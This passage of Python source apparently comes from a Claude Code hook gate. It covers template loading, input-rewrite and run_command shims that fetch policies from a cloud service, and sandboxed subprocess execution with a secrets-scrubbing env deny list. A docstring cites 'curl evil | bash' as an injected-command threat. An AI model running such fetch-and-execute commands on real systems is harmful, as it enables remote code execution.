        fd = os.open(path, os.O_RDONLY | os.O_NOFOLLOW)
    except (FileNotFoundError, OSError):
        return 0
    # P2 follow-up: refuse world/group-writable template files. The
    # sidecar's role is "text the model sees" — if anyone other than
    # the operator can rewrite the file, an attacker can inject
    # arbitrary additionalContext into the model's view. Mirrors the
    # `_read_cached` pubkey hygiene we already apply to MAGI_CP_LOCAL_DIR
    # so context templates get the same handling as the heartbeat
    # cache. The compiler writes with the process umask which on a
    # typical operator workstation gives 0o644; reject 0o66x / 0o67x /
    # any world-writable mode regardless.
    try:
        st = os.fstat(fd)
        if st.st_mode & 0o022:
            os.close(fd)
            return 0
    except OSError:
        os.close(fd)
        return 0
    try:
        data = b""
        while True:
            chunk = os.read(fd, 65536)
            if not chunk:
                break
            data += chunk
    finally:
        os.close(fd)
    if not data:
        return 0
    try:
        template = data.decode("utf-8")
    except UnicodeDecodeError:
        return 0
    _emit_additional_context(event, template)
    return 0   # unreachable; _emit_additional_context exits


def heartbeat_cli() -> int:  # pragma: no cover (CLI entry)
    """Standalone heartbeat poster. Wire into cron / launchd /
    systemd-timer to fire every ~5 minutes. Silent on failure (exit 0
    either way) so a transient cloud blip doesn't page the operator
    via cron error mail."""
    post_heartbeat()
    return 0


# D57f-2 — input-rewrite shim. Compiler emits a PreToolUse hook of shape
# `magi-cp-input-rewrite --policy <id>`. The shim reads the standard
# PreToolUse JSON on stdin, POSTs (policy_id, tool_input) to the cloud,
# and prints whatever updatedInput the cloud returns.
#
# Authoring contract recap (see InputRewritePolicy + rewriters.py):
#   - The shim does NOT interpret a rewriter spec itself. The cloud is
#     the rewriter; the shim is the courier. A compromised endpoint
#     cannot mint a novel rewrite operation locally.
#   - All failure modes degrade to "exit 0, empty stdout" so a missing
#     cloud / malformed reply / oversize payload becomes a transparent
#     no-op (CC runs the tool with the original input). Fail-closed on
#     the rewrite path would block the tool over a config blip — the
#     EvidencePolicy lane is the right surface to refuse.
_INPUT_REWRITE_POLICY_ID_RE = re.compile(r"^[A-Za-z0-9][A-Za-z0-9._\-/]{0,127}$")


def _emit_updated_input(updated_input: dict) -> None:
    """Print the CC-canonical hookSpecificOutput JSON carrying the
    rewritten tool_input under `updatedInput` and exit 0.

    Single emission path so every PreToolUse rewrite produces
    byte-identical JSON (modulo the dict body). CC consumes the
    `updatedInput` field on PreToolUse only — the matrix + policy
    validator already pin event=PreToolUse.

    P1 follow-up: emit `permissionDecision: "allow"` alongside
    `updatedInput`. The doc'd CC contract is
    `{decision, updatedInput, additionalContext, continue}` (see
    docs/architecture/claude-code-cli/08-coding-harness-internals.md);
    a hookSpecificOutput WITHOUT a permission stance is version-
    dependent — some builds parse the `updatedInput` but leave the
    permission flow to a downstream hook, others ignore the field
    entirely. Pairing the rewrite with an explicit `allow` makes the
    intent unambiguous across CC builds: "apply the rewrite and
    approve this tool call". Downstream EvidencePolicy gates remain
    the place to deny — they fire on their own hook entry and their
    `deny` overrides this `allow`.
    """
    print(json.dumps({
        "hookSpecificOutput": {
            "hookEventName": "PreToolUse",
            "permissionDecision": "allow",
            "updatedInput": updated_input,
        }
    }, ensure_ascii=False))
    sys.exit(0)


def input_rewrite_cli() -> int:
    """`magi-cp-input-rewrite` entry point.

    Reads the PreToolUse hook JSON on stdin, asks the cloud for a
    rewrite verdict against the policy named on `--policy`, and emits
    the updatedInput JSON when the cloud returns a changed dict.

    Failure modes (every one exits 0 with empty stdout):
      - missing / malformed `--policy <id>` argv
      - missing / unparseable stdin payload
      - missing tool_input dict
      - cloud unreachable / non-200 / malformed reply
      - cloud returned `updated_input` identical to the original (no-op)
      - cloud returned a non-dict updated_input (refuse silently)
    """
    argv = sys.argv[1:]
    policy_id = ""
    i = 0
    while i < len(argv):
        arg = argv[i]
        if arg == "--policy" and i + 1 < len(argv):
            policy_id = argv[i + 1]
            i += 2
            continue
        i += 1
    if not policy_id or not _INPUT_REWRITE_POLICY_ID_RE.match(policy_id):
        return 0

    raw = sys.stdin.read()
    if not raw or len(raw) > 256_000:
        # Outsized payloads are not the rewrite path's concern.
        return 0
    try:
        payload = json.loads(raw)
    except json.JSONDecodeError:
        return 0
    if not isinstance(payload, dict):
        return 0
    tool_input = payload.get("tool_input")
    if not isinstance(tool_input, dict):
        return 0
    tool_name = payload.get("tool_name")
    if not isinstance(tool_name, str) or not tool_name:
        # P2 follow-up: surface an unfamiliar payload shape to stderr so
        # the operator sees the rewriter going silent during early rollout.
        # The matrix + policy validator only enable input_rewrite on
        # PreToolUse, where CC's real payload includes `tool_name` (snake
        # case in the bundled coreTypes.ts; the docstring at the top of
        # this module pins Claude Code 2.1.170). A missing key here means
        # either CC changed its payload shape on this version or a
        # downstream caller fed the shim a non-PreToolUse JSON. We exit 0
        # so the tool call still proceeds (fail-soft per the rewriter
        # contract), but the stderr line is the only signal the operator
        # has that the rewrite never fired.
        sys.stderr.write(
            "magi-cp-input-rewrite: payload missing `tool_name`; "
            "rewrite skipped (no-op). PreToolUse payload shape may have "
            "changed; verify against the CC version in use.\n"
        )
        return 0

    cloud = _cloud_url()
    try:
        _enforce_url_scheme(cloud)
    except ValueError:
        return 0
    body = json.dumps({
        "policy_id": policy_id,
        "tool_name": tool_name,
        "tool_input": tool_input,
    }, ensure_ascii=False).encode("utf-8")
    # P1 follow-up: forward MAGI_CP_API_KEY (the same env the heartbeat
    # path uses at gate.py:462) as `X-Api-Key`. The cloud-side route
    # accepts the call without a header for backwards compatibility
    # (the local-gate loopback dev loop has no tenant credential by
    # default), but when an operator HAS set the env we want to bind
    # this remote rewrite verdict to the gate's identity so a third
    # party can't poll the endpoint to enumerate policy ids / probe
    # rewriter behaviour. The shim doesn't fail if the key is unset;
    # the cloud-side dependency does the matching enforcement decision.
    req_headers = {"Content-Type": "application/json"}
    forwarded_key = os.environ.get("MAGI_CP_API_KEY")
    if forwarded_key:
        req_headers["X-Api-Key"] = forwarded_key
    req = urllib.request.Request(
        cloud + "/policies/input_rewrite",
        method="POST",
        data=body,
        headers=req_headers,
    )
    try:
        with urllib.request.urlopen(req, timeout=5) as r:
            reply = json.loads(r.read())
    except (urllib.error.URLError, OSError, json.JSONDecodeError):
        return 0
    if not isinstance(reply, dict):
        return 0
    if not reply.get("rewrote"):
        return 0
    new_input = reply.get("updated_input")
    if not isinstance(new_input, dict):
        return 0
    if new_input == tool_input:
        return 0
    _emit_updated_input(new_input)
    return 0   # unreachable; _emit_updated_input exits


# D63 — run_command shim. The compiler emits a hook entry of shape
# `magi-cp-run-command --policy <id>`. The shim asks the cloud which
# policy fires, executes the inline command (or attached script) under
# the named runtime with a wall-clock timeout, captures stdout/stderr,
# writes a ledger row, and prints whatever the command emitted to CC
# (subject to the canonical hookSpecificOutput shape).
#
# Self-host model: the command runs as the magi-cp process. The brief
# explicitly accepts this — D63 ships under MAGI_CP_ALLOW_RUN_COMMAND=1
# on the docker compose default, =0 on the hosted image. Equivalent to
# CC's own `{type: "command"}` hook entries: the operator owns the
# machine and the script body.
_RUN_COMMAND_POLICY_ID_RE = _INPUT_REWRITE_POLICY_ID_RE
_RUN_COMMAND_MAX_STDOUT = 64 * 1024
_RUN_COMMAND_MAX_STDERR = 16 * 1024
_RUN_COMMAND_TRUNCATED_TAG = b"...[truncated]"
# Per-policy grace window between SIGTERM and SIGKILL on the entire
# child process group. Brief: "give a small grace window then escalate".
_RUN_COMMAND_TERM_GRACE_SECONDS = 0.25
# Env names that must NEVER be forwarded into a run_command child.
# `MAGI_CP_*` covers our own admin/api keys, `*_API_KEY` / `*_TOKEN` /
# `*_SECRET` / `*_PASSWORD` cover the common third-party shapes.
_RUN_COMMAND_ENV_DENY_RE = re.compile(
    r"(?:^MAGI_CP_)|"
    r"(?:_API_KEY$)|(?:^API_KEY$)|"
    r"(?:_TOKEN$)|(?:^TOKEN$)|"
    r"(?:_SECRET$)|(?:^SECRET$)|"
    r"(?:_PASSWORD$)|(?:^PASSWORD$)",
)
# Minimal allowlist the child inherits when no per-policy forward list
# is configured. Operators authoring a script that needs more (e.g. a
# corp env var) should add a future `forward_env` field on the IR; for
# now we ship a sane minimum so `bash`, `python3`, `node` work.
_RUN_COMMAND_DEFAULT_ENV_ALLOW: tuple[str, ...] = (
    "PATH", "HOME", "LANG", "LC_ALL", "LC_CTYPE", "LC_MESSAGES",
    "TZ", "USER", "LOGNAME", "SHELL",
)


def _ledger_path() -> str:
    """Append-only JSONL ledger the run_command shim writes execution
    receipts to. Operators can tail this file for an audit trail of
    every shell command the gate spawned.
    """
    return os.environ.get(
        "MAGI_CP_RUN_COMMAND_LEDGER",
        os.path.join(_local_dir(), "run_command_ledger.jsonl"),
    )


def _ledger_append(row: dict) -> None:
    """Best-effort JSONL append. Silent on disk-full / permission errors
    so a logging gap never blocks the gate's response to CC.

    Issue D63 P2 (ledger-leak): create the ledger file 0o600 so a
    non-root local user cannot read receipts containing run_command
    stdout / stderr the operator's scripts may have echoed (PII /
    tokens / API replies). Mirrors the 0o600 treatment the pubkey
    cache file gets in :func:`_load_pubkey_for_kid`.
    """
    path = _ledger_path()
    try:
        os.makedirs(os.path.dirname(path) or ".", exist_ok=True)
        line = (json.dumps(row, ensure_ascii=False) + "\n").encode("utf-8")
        if not os.path.exists(path):
            fd = os.open(
                path,
                os.O_WRONLY | os.O_CREAT | os.O_APPEND | os.O_NOFOLLOW,
                0o600,
            )
            try:
                os.write(fd, line)
            finally:
                os.close(fd)
            return
        # File exists: append with O_NOFOLLOW (refuse symlinks) and
        # leave the mode alone if the operator has loosened it.
        fd = os.open(path, os.O_WRONLY | os.O_APPEND | os.O_NOFOLLOW)
        try:
            os.write(fd, line)
        finally:
            os.close(fd)
    except OSError:
        pass


def _truncate_bytes(data: bytes, cap: int) -> tuple[bytes, bool]:
    """Cap a bytes blob at `cap` BYTES (not codepoints). Returns
    (trimmed, truncated?). Brief: "switch to a byte budget" so the
    ledger never holds more than the advertised cap on disk.
    """
    if len(data) <= cap:
        return data, False
    head_len = cap - len(_RUN_COMMAND_TRUNCATED_TAG)
    if head_len < 0:
        head_len = 0
    return data[:head_len] + _RUN_COMMAND_TRUNCATED_TAG, True


def _bytes_to_str_for_ledger(data: bytes) -> str:
    """Decode bytes for the ledger row. Replaces undecodable bytes so a
    binary blob never breaks JSON serialization."""
    return data.decode("utf-8", errors="replace")


def _build_run_command_env(forward_env: list[str] | None = None) -> dict[str, str]:
    """Build the env dict a run_command child inherits.

    Hardened by default: the parent gate's MAGI_CP_* keys (admin /
    tenant API keys), as well as common third-party API key shapes,
    are scrubbed regardless of the allowlist. Operators that need to
    forward a specific env can pass `forward_env` (a list of allowed
    names); the cloud-side IR doesn't carry this today but the helper
    is plumbed so a future per-policy `forward_env: [str]` field flows
    through without re-touching this path.
    """
    parent = os.environ
    allowed: set[str] = set(_RUN_COMMAND_DEFAULT_ENV_ALLOW)
    for name in forward_env or ():
        if isinstance(name, str) and name and not _RUN_COMMAND_ENV_DENY_RE.search(name):
            allowed.add(name)
    out: dict[str, str] = {}
    for k, v in parent.items():
        if not isinstance(k, str) or not isinstance(v, str):
            continue
        if k not in allowed:
            continue
        if _RUN_COMMAND_ENV_DENY_RE.search(k):
            # Defense in depth: refuse even if an operator added a
            # deny-pattern key to `forward_env`.
            continue
        out[k] = v
    return out


def _default_run_command_cwd(policy_id: str) -> str:
    """Per-policy scratch dir under MAGI_CP_LOCAL_DIR / run_command /.

    Brief: "deterministic default CWD … under
    `~/.magi-cp/local/run_command/<policy_id>/`". Falls back to a
    tempdir if the local dir is unwritable (the gate must still
    respond to CC). The policy id is sanitized so a path-shaped id
    can't escape the scratch root.
    """
    safe = re.sub(r"[^A-Za-z0-9._\-]", "_", policy_id)[:64] or "_anon"
    root = os.path.join(_local_dir(), "run_command", safe)
    try:
        os.makedirs(root, exist_ok=True)
        return root
    except OSError:
        import tempfile as _tf
        return _tf.gettempdir()


def execute_run_command(
    *,
    policy_id: str,
    runtime: str,
    command: str = "",
    script_path: str = "",
    args: list[str] | None = None,
    timeout_ms: int = 5_000,
    fail_closed: bool = False,
    working_dir: str | None = None,
    forward_env: list[str] | None = None,
) -> dict:
    """Run an inline command or attached script under a runtime.

    Returns the dict that should be emitted on the CC hook stdout
    channel — either the JSON the command itself printed, or the
    canonical allow/deny shape on a soft failure / fail-closed lane.

    Soft failures (default = allow, ledger records the reason):
      - non-zero exit + fail_closed=False
      - stdout parse failure (not valid JSON)
      - timeout (the partial stdout is NOT trusted; we never honor a
        half-emitted decision from a process we had to kill)

    Fail-closed lane: when `fail_closed=True`, non-zero exit and
    timeouts both emit a deny shape with permissionDecisionReason
    pointing at the run_command policy.

    Subprocess hardening (D63 review findings):
      - The child runs in its OWN session (``start_new_session=True``)
        so timeout escalates to ``killpg(SIGTERM)`` then ``killpg(SIGKILL)``
        across the entire process group. Grandchildren a script forked
        (``while true; do sleep 60 & done``) are reaped along with the
        direct child.
      - Stdout/stderr are read on background threads with a hard byte
        cap; bytes past the cap are drained-and-dropped (the child
        never blocks on a full pipe, but the gate's memory footprint
        stays bounded regardless of how loud the script is).
      - Env is scrubbed to a minimal allowlist (``PATH`` + locale + a
        few daemons). ``MAGI_CP_*`` and ``*_API_KEY``-shaped names are
        denied even from the per-policy `forward_env` allowlist so an
        operator-author cannot accidentally leak the cloud's admin key
        into a hook script that hits a webhook.
      - ``working_dir`` falls back to a per-policy scratch dir under
        ``~/.magi-cp/local/run_command/<policy_id>/`` (not $HOME) so a
        relative-path script behaves the same regardless of where CC
        fired the hook.
    """
    import subprocess as _sp
    import threading as _th
    import time as _time
    args = list(args or [])
    if (bool(command) == bool(script_path)):
        # Defensive: validator already enforces this, but the gate is
        # the trust boundary for any policy that slipped past authoring.
        _ledger_append({
            "ts": int(_time.time()),
            "policy_id": policy_id,
            "kind": "run_command_execution",
            "exit_code": None,
            "duration_ms": 0,
            "stdout": "",
            "stderr_summary": (
                "config error: exactly one of command / script_path must be set"
            ),
            "error": "config",
        })
        if fail_closed:
            return _deny_dict(
                f"run_command policy '{policy_id}': config error"
            )
        return _allow_dict()

    if command:
        if runtime == "bash":
            argv = ["bash", "-c", command, "magi-cp-run-command", *args]
        elif runtime == "python3":
            argv = ["python3", "-c", command, "magi-cp-run-command", *args]
        elif runtime == "node":
            argv = ["node", "-e", command, "magi-cp-run-command", *args]
        else:
            _ledger_append({
                "ts": int(_time.time()),
                "policy_id": policy_id,
                "kind": "run_command_execution",
                "exit_code": None,
                "duration_ms": 0,
                "stdout": "",
                "stderr_summary": f"unknown runtime {runtime!r}",
                "error": "runtime",
                "runtime": runtime,
            })
            if fail_closed:
                return _deny_dict(
                    f"run_command policy '{policy_id}': unknown runtime"
                )
            return _allow_dict()
    else:
        # Attached script: runtime + path + args.
        argv = [runtime, script_path, *args]

    # Resolve cwd / env BEFORE the spawn so a misconfigured local dir
    # doesn't leak the operator's working tree into the child (P1
    # working-dir finding).
    cwd_to_use = working_dir if working_dir else _default_run_command_cwd(policy_id)
    child_env = _build_run_command_env(forward_env)

    started = _time.monotonic()
    timeout_s = max(0.1, min(30.0, timeout_ms / 1000.0))
    proc_stdout_buf = bytearray()
    proc_stderr_buf = bytearray()
    truncated_stdout = False
    truncated_stderr = False
    exit_code: int | None = None
    timed_out = False
    error: str | None = None
    proc: _sp.Popen | None = None
    argv0 = argv[0] if argv else ""

    def _drain(stream, sink: bytearray, cap: int) -> bool:
        """Read from `stream` until EOF, copying up to `cap` bytes into
        `sink`. Continues to read-and-drop past the cap so the child
        never blocks on a full pipe. Returns True iff bytes were
        dropped (i.e. truncated)."""
        dropped = False
        try:
            while True:
                chunk = stream.read(4096)
                if not chunk:
                    return dropped
                remaining = cap - len(sink)
                if remaining > 0:
                    sink.extend(chunk[:remaining])
                if len(chunk) > remaining and remaining >= 0:
                    if remaining < len(chunk):
                        dropped = True
        except (OSError, ValueError):
            return dropped

    try:
        # ``start_new_session=True`` puts the child into its own
        # process group; we kill the GROUP on timeout so grandchildren
        # are reaped too. On Windows this raises NotImplementedError
        # — magi-cp self-host is *nix-only today, but we fall back to
        # the legacy ``creationflags`` path for parity.
        popen_kwargs: dict = {
            "cwd": cwd_to_use,
            "stdin": _sp.DEVNULL,
            "stdout": _sp.PIPE,
            "stderr": _sp.PIPE,
            "env": child_env,
            "close_fds": True,
        }
        if hasattr(os, "setsid"):
            popen_kwargs["start_new_session"] = True
        proc = _sp.Popen(argv, **popen_kwargs)
    except (FileNotFoundError, OSError) as e:
        error = f"spawn:{type(e).__name__}"
        # Issue D63 P2 (spawn diagnostic): include runtime + argv0 so a
        # tail of the ledger surfaces "node not installed" actionably.
        _ledger_append({
            "ts": int(_time.time()),
            "policy_id": policy_id,
            "kind": "run_command_execution",
            "exit_code": None,
            "duration_ms": 0,
            "stdout": "",
            "stderr_summary": f"spawn failed: {type(e).__name__}: {e}",
            "stderr_truncated": False,
            "stdout_truncated": False,
            "timed_out": False,
            "parse_error": None,
            "error": error,
            "runtime": runtime,
            "argv0": argv0,
        })
        try:
            sys.stderr.write(
                f"magi-cp-run-command: spawn failed for policy '{policy_id}': "
                f"{type(e).__name__}: {e} (runtime={runtime!r}, argv0={argv0!r})\n"
            )
        except OSError:
            pass
        # Brief: "consider treating 'runtime binary missing' as
        # fail_closed regardless of policy setting (the policy clearly
        # intended to run something)." FileNotFoundError on the
        # interpreter binary is unambiguous — fail closed.
        if isinstance(e, FileNotFoundError) or fail_closed:
            return _deny_dict(
                f"run_command policy '{policy_id}': {error} "
                f"(runtime {runtime!r} missing or unspawnable)"
            )
        return _allow_dict()

    assert proc is not None
    # Read both streams on background threads with byte-bounded sinks.
    truncated_stdout_box = [False]
    truncated_stderr_box = [False]

    def _stdout_worker() -> None:
        truncated_stdout_box[0] = _drain(
            proc.stdout, proc_stdout_buf, _RUN_COMMAND_MAX_STDOUT,
        )

    def _stderr_worker() -> None:
        truncated_stderr_box[0] = _drain(
            proc.stderr, proc_stderr_buf, _RUN_COMMAND_MAX_STDERR,
        )

    t_out = _th.Thread(target=_stdout_worker, daemon=True)
    t_err = _th.Thread(target=_stderr_worker, daemon=True)
    t_out.start()
    t_err.start()

    try:
        exit_code = proc.wait(timeout=timeout_s)
    except _sp.TimeoutExpired:
        timed_out = True
        error = "timeout"
        # Brief P0: SIGTERM-grace-SIGKILL on the WHOLE group, not just
        # the direct child PID. Stock subprocess.run only kills the
        # direct child — that leaks grandchildren forever.
        try:
            if hasattr(os, "killpg") and hasattr(os, "getpgid"):
                try:
                    pgid = os.getpgid(proc.pid)
                    os.killpg(pgid, signal.SIGTERM)
                except (ProcessLookupError, OSError):
                    pass
                # Grace window: a well-behaved child exits on SIGTERM.
                try:
                    exit_code = proc.wait(timeout=_RUN_COMMAND_TERM_GRACE_SECONDS)
                except _sp.TimeoutExpired:
                    try:
                        pgid = os.getpgid(proc.pid)
                        os.killpg(pgid, signal.SIGKILL)
                    except (ProcessLookupError, OSError):
                        pass
                    try:
                        exit_code = proc.wait(timeout=1.0)
                    except _sp.TimeoutExpired:
                        exit_code = None
            else:  # pragma: no cover — Windows fallback
                proc.terminate()
                try:
                    exit_code = proc.wait(timeout=_RUN_COMMAND_TERM_GRACE_SECONDS)
                except _sp.TimeoutExpired:
                    proc.kill()
                    try:
                        exit_code = proc.wait(timeout=1.0)
                    except _sp.TimeoutExpired:
                        exit_code = None
        finally:
            # Drain readers so threads can exit cleanly. The streams
            # close as soon as the child is reaped above; the workers
            # will see EOF and return.
            pass
    finally:
        t_out.join(timeout=1.0)
        t_err.join(timeout=1.0)
        try:
            if proc.stdout is not None:
                proc.stdout.close()
        except OSError:
            pass
        try:
            if proc.stderr is not None:
                proc.stderr.close()
        except OSError:
            pass

    truncated_stdout = truncated_stdout_box[0]
    truncated_stderr = truncated_stderr_box[0]
    duration_ms = int((_time.monotonic() - started) * 1000)
    # Byte-bounded slice for the ledger (the read drain already
    # capped, but be defensive in case the reader filled past the
    # marker between the cap check and the worker exit).
    stdout_bytes, stdout_marker = _truncate_bytes(
        bytes(proc_stdout_buf), _RUN_COMMAND_MAX_STDOUT,
    )
    stderr_bytes, stderr_marker = _truncate_bytes(
        bytes(proc_stderr_buf), _RUN_COMMAND_MAX_STDERR,
    )
    truncated_stdout = truncated_stdout or stdout_marker
    truncated_stderr = truncated_stderr or stderr_marker
    proc_stdout_s = _bytes_to_str_for_ledger(stdout_bytes)
    proc_stderr_s = _bytes_to_str_for_ledger(stderr_bytes)

    parsed: dict | None = None
    parse_error: str | None = None
    # Brief P2: NEVER honor a timeout-killed child's stdout as the CC
    # decision. The partial JSON could be a deliberate
    # `{ echo allow; sleep 9999; }` exfil. Log it for audit but do
    # not surface it to CC.
    if proc_stdout_s and not timed_out:
        try:
            decoded = json.loads(proc_stdout_s)
            if isinstance(decoded, dict):
                parsed = decoded
            else:
                parse_error = "stdout is not a JSON object"
        except json.JSONDecodeError as e:
            parse_error = f"stdout JSON parse: {e}"

    _ledger_append({
        "ts": int(_time.time()),
        "policy_id": policy_id,
        "kind": "run_command_execution",
        "exit_code": exit_code,
        "duration_ms": duration_ms,
        "stdout": proc_stdout_s,
        "stdout_truncated": truncated_stdout,
        "stderr_summary": proc_stderr_s,
        "stderr_truncated": truncated_stderr,
        "timed_out": timed_out,
        "parse_error": parse_error,
        "error": error,
        "runtime": runtime,
        "argv0": argv0,
    })

    # Decide the return shape.
    if error == "timeout":
        if fail_closed:
            return _deny_dict(
                f"run_command policy '{policy_id}': timeout after "
                f"{timeout_ms}ms"
            )
        # Soft lane: NEVER honor a half-emitted decision from a
        # process we had to kill. Ledger has the partial bytes for
        # forensics; CC sees a clean allow.
        return _allow_dict()
    if error is not None:
        if fail_closed:
            return _deny_dict(
                f"run_command policy '{policy_id}': {error}"
            )
        return _allow_dict()
    if exit_code is not None and exit_code != 0:
        if fail_closed:
            return _deny_dict(
                f"run_command policy '{policy_id}': non-zero exit "
                f"({exit_code})"
            )
        # Audit + continue.
        if parsed is not None:
            return parsed
        return _allow_dict()
    if parsed is not None:
        return parsed
    # Empty / unparseable stdout on a 0 exit → allow (the command
    # ran cleanly, just had nothing to say). Brief: "On stdout parse
    # failure, default to {decision: 'allow'} but log the parse error
    # to ledger" — the parse_error already landed above.
    return _allow_dict()


def _allow_dict() -> dict:
    return {
        "hookSpecificOutput": {
            "permissionDecision": "allow",
        }
    }


def _deny_dict(reason: str, *, hook_event_name: str = "PreToolUse") -> dict:
    """In-process counterpart to `_deny` — returns the deny dict instead
    of printing + exiting. D82d-aware: PostToolUse / PostToolUseFailure /
    PostToolBatch get the retry-feedback top-level `decision`+`reason`
    shape, every other event keeps the historical PreToolUse
    `hookSpecificOutput.permissionDecision` shape.

    The default stays `PreToolUse` so legacy callers (run_command path
    that pre-dates per-event dispatch) keep byte-identical output.
    """
    return _emit_deny_payload(reason, hook_event_name=hook_event_name)


def _require_signed_run_command_spec() -> bool:
    """LOCAL-1: unsigned run_command specs are refused BY DEFAULT.

    The reply drives a local command execution, so an unsigned spec from a MITM
    on the loopback / sidecar bind could inject ``command='curl evil | bash'``.
    The installed self-host image always carries a keystore, so the signed path
    is the norm. Operators opt out only with an explicit
    ``MAGI_CP_REQUIRE_SIGNED_RUN_COMMAND_SPEC=0``.
    """
    return os.environ.get("MAGI_CP_REQUIRE_SIGNED_RUN_COMMAND_SPEC", "1") != "0"


def run_command_cli() -> int:
    """`magi-cp-run-command` entry point.

    Reads the CC hook payload on stdin, asks the cloud for the
    resolved RunCommandPolicy spec, executes it, and prints whatever
    the command emitted as the hookSpecificOutput JSON.

    Failure modes (every one exits 0; the gate is fail-soft):
      - missing / malformed `--policy <id>` argv
      - missing / unparseable stdin payload
      - cloud unreachable / non-200 / unknown policy id
      - subprocess spawn error
      - (under fail_closed=True) timeout / non-zero exit → deny JSON
    """
    argv = sys.argv[1:]
    policy_id = ""
    i = 0
    while i < len(argv):
        arg = argv[i]
        if arg == "--policy" and i + 1 < len(argv):
            policy_id = argv[i + 1]
            i += 2
            continue
        i += 1
    if not policy_id or not _RUN_COMMAND_POLICY_ID_RE.match(policy_id):
        return 0

    raw = sys.stdin.read() if not sys.stdin.isatty() else ""
    if len(raw) > 256_000:
        return 0
    payload: dict | None = None
    if raw:
        try:
            decoded = json.loads(raw)
            if isinstance(decoded, dict):
                payload = decoded
        except json.JSONDecodeError:
            payload = None

    cloud = _cloud_url()
    try:
        _enforce_url_scheme(cloud)
    except ValueError:
        return 0

    body = json.dumps({
        "policy_id": policy_id,
        "payload": payload or {},
    }, ensure_ascii=False).encode("utf-8")
    headers = {"Content-Type": "application/json"}
    forwarded_key = os.environ.get("MAGI_CP_API_KEY")
    if forwarded_key:
        headers["X-Api-Key"] = forwarded_key
    req = urllib.request.Request(
        cloud + "/policies/run_command",
        method="POST",
        data=body,
        headers=headers,
    )
    try:
        with urllib.request.urlopen(req, timeout=5) as r:
            reply = json.loads(r.read())
    except (urllib.error.URLError, OSError, json.JSONDecodeError):
        return 0
    if not isinstance(reply, dict) or not reply.get("matched"):
        return 0
    # P1 (sign-reply): if the cloud returned a signed envelope, verify
    # the Ed25519 token under the cloud's pinned pubkey BEFORE
    # honoring `spec`. The shim already trusts the pubkey cache for
    # WAL token verification; same anchor here. Refusal lanes:
    #   - signature invalid → silent allow (fail-soft)
    #   - kid mismatch → silent allow
    #   - spec body's policy_id != requested → silent allow
    # An unsigned reply is still accepted when the env knob
    # `MAGI_CP_REQUIRE_SIGNED_RUN_COMMAND_SPEC=1` is unset; tests in
    # the in-process app factory build without a keystore and exercise
    # the legacy shape. Self-host docker compose carries a keystore by
    # default so signed is the operative path. Operators wanting
    # hard-enforce can set the env var to "1".
    signed = reply.get("signed")
    spec: dict | None = None
    if isinstance(signed, str) and signed:
        signed_kid = reply.get("kid")
        try:
            pub = _load_pubkey_for_kid(
                signed_kid if isinstance(signed_kid, str) else None,
            )
        except (urllib.error.URLError, OSError, ValueError):
            return 0
        body = verify_token(signed, pub)
        if not isinstance(body, dict):
            return 0
        if body.get("kind") != "run_command_spec":
            return 0
        if body.get("policy_id") != policy_id:
            return 0
        signed_spec = body.get("spec")
        if isinstance(signed_spec, dict):
            spec = signed_spec
    if spec is None:
        if _require_signed_run_command_spec():
            return 0   # strict-by-default: refuse unsigned replies
        unsigned_spec = reply.get("spec")
        if isinstance(unsigned_spec, dict):
            spec = unsigned_spec
    if not isinstance(spec, dict):
        return 0

    out = execute_run_command(
        policy_id=policy_id,
        runtime=str(spec.get("runtime", "bash")),
        command=str(spec.get("command", "")),
        script_path=str(spec.get("script_path", "")),
        args=list(spec.get("args", []) or []),
        timeout_ms=int(spec.get("timeout_ms", 5_000)),
        fail_closed=bool(spec.get("fail_closed", False)),
        working_dir=spec.get("working_dir"),
        forward_env=list(spec.get("forward_env", []) or []) or None,
    )
    if out:
        print(json.dumps(out, ensure_ascii=False))
    return 0


if __name__ == "__main__":  # pragma: no cover
    raise SystemExit(cli())
